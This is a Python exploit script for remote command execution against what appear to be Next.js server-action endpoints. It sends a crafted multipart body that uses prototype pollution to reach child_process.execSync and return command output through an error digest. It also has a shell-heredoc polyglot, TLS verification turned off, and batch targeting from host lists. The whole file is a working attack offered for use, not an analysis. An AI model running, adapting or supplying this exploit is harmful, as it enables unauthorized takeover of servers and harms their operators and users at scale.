#!/usr/bin/env python3

import socket
import ssl
import sys
import urllib.parse as urlparse
import argparse
import json
import re

def exploit(host, command, port=443, scheme='https'):
    # This updated body acts as a polyglot: 
    # It keeps the HTTP multipart structure intact while using a shell heredoc (: << 'boundary')
    # to force the backend terminal to safely skip the metadata until it runs your dynamic command.
    body = f''': << '------WebKitFormBoundaryx8jO2oVc6SWP3Sad'
Content-Disposition: form-data; name="0"

{{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{{\\"then\\":\\"$B1337\\"}}",
  "_response": {{
    "_prefix": "var res=process.mainModule.require('child_process').execSync('{command}',{{'timeout':5000}}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:res}});",
    "_chunks": "$Q2",
    "_formData": {{
      "get": "$1:constructor:constructor"
    }}
  }}
}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
{command}
#'''
    
    # Replace \n with \r\n for HTTP
    body = body.replace('\n', '\r\n')
    
    # Build headers
    headers = f'''POST / HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: {len(body)}

'''
    
    headers = headers.replace('\n', '\r\n')
    request = headers + body
    
    # Create socket and optionally wrap with SSL for HTTPS
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn = None
    if scheme == 'https':
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        conn = context.wrap_socket(sock, server_hostname=host)
    else:
        conn = sock

    try:
        print(f"[*] Connecting to {host}:{port} ({scheme})")
        conn.connect((host, port))

        print(f"[*] Sending payload with command: {command}")
        conn.sendall(request.encode())

        response = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            response += chunk
            if b"\r\n\r\n" in response and len(response) > 500:
                break
        
        response_text = response.decode('utf-8', errors='ignore')
        print(f"[*] Response received, parsing output...")
        
        # Try to extract and unescape the command output from JSON digest
        try:
            # Look for the pattern 1:E{...}
            match = re.search(r'1:E(\{.*\})', response_text, re.DOTALL)
            if match:
                json_str = match.group(1)
                data = json.loads(json_str)
                if 'digest' in data:
                    output = data['digest']
                    # Unescape newlines and print
                    output = output.replace('\\n', '\n')
                    print(f"[+] Command output:\n{output}")
                else:
                    print(f"[*] Response:\n{response_text}")
            else:
                print(f"[*] Response:\n{response_text}")
        except Exception as e:
            print(f"[*] Could not parse JSON output: {e}")
            print(f"[*] Raw response:\n{response_text}")
        
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        try:
            conn.close()
        except Exception:
            pass


def parse_target(raw, default_scheme='https', default_port=443):
    """Parse a raw target string and return (host, port, scheme)."""
    scheme = default_scheme
    port = default_port
    host = raw

    if '://' in raw:
        p = urlparse.urlparse(raw)
        scheme = p.scheme or default_scheme
        host = p.hostname or p.path
        if p.port:
            port = p.port
        return host, port, scheme

    if raw.count(':') >= 1 and not raw.startswith('['):
        parts = raw.rsplit(':', 1)
        if len(parts) == 2 and parts[1].isdigit():
            host = parts[0]
            port = int(parts[1])
            if port in (443, 8443):
                scheme = 'https'
            else:
                scheme = 'http'

    return host, port, scheme

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit script: send payload to a host or list of hosts")
    parser.add_argument('-l', '--list', dest='listfile', help='Path to file with target IPs (one per line)')
    parser.add_argument('--list-ports', dest='listfile_ports', help='Path to file with IPs and ports')
    parser.add_argument('host', nargs='?', help='Target host')
    parser.add_argument('command', help='Command to run on target')
    args = parser.parse_args()

    if args.listfile_ports:
        try:
            with open(args.listfile_ports, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    parts = line.split('\t')
                    if len(parts) < 2:
                        continue
                    raw_host = parts[0]
                    host, port, scheme = parse_target(raw_host)

                    try:
                        port_override = int(parts[1])
                        port = port_override
                    except ValueError:
                        continue

                    if len(parts) >= 3 and parts[2].strip().lower() in ('http', 'https'):
                        scheme = parts[2].strip().lower()
                    else:
                        if '://' not in raw_host:
                            scheme = 'https' if port in (443, 8443) else 'http'

                    exploit(host, args.command, port, scheme)
        except Exception as e:
            print(f"[!] Failed to read list file: {e}")
            sys.exit(1)
    elif args.listfile:
        try:
            with open(args.listfile, 'r') as f:
                hosts = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"[!] Failed to read list file: {e}")
            sys.exit(1)

        for h in hosts:
            host, port, scheme = parse_target(h)
            exploit(host, args.command, port, scheme)
    else:
        if not args.host:
            parser.print_usage()
            sys.exit(1)
        host_raw = args.host
        host, port, scheme = parse_target(host_raw)
        exploit(host, args.command, port, scheme)      